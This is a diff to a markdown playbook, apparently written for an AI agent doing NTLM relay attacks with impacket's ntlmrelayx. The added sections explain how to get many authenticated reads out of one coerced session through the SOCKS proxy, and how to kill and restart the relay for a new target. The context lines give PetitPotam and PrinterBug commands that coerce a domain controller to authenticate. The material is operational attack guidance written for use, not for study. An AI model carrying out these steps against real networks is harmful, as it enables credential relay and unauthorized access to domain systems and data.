@@ -27,6 +27,20 @@ or `run_daemon`. The commands below are **examples** — compose your own.
   multiple users to one target) has thrown `'NTLMRelayxConfig' object has no attribute
   'remove_target'` against bundled impacket 0.13.1 — drop it and restart clean if hit.
 
+## One coercion, many requests — the SOCKS session is single-use
+Impacket's ntlmrelayx SOCKS proxy spends the relayed session after ONE request through it — a
+second request needs a fresh coercion, not a retry. Don't re-coerce per request: open ONE
+connection through `socks5h://127.0.0.1:1080` on keep-alive, coerce once, then send every
+request you want down that same connection before it closes — turns one coercion into N
+authenticated reads instead of N coercions. ghostsurf (above) solves this natively when it isn't
+hitting a bug; this is the fallback when it's unavailable or broken.
+
+## Restarting the relay for a new target
+Switching targets or modes (SMB → SOCKS, or a different host) needs a clean restart, not a
+second instance on the same port: `sudo pkill -9 -f ntlmrelayx` (or `ghostsurf`), `sleep 2-3`,
+then verify with `sudo ss -lntp | grep -E ':80 |:1080'` before starting the new one — skipping
+the verify step is what produces `OSError: [Errno 98] Address already in use` on the first try.
+
 ## Trigger the coercion
 - Example (PetitPotam, MS-EFSR): `petitpotam <your-ip> <dc>`
 - Example (PrinterBug, MS-RPRN): `local_exec("printerbug.py <domain>/<user>:<pass>@<dc> <your-ip>")`
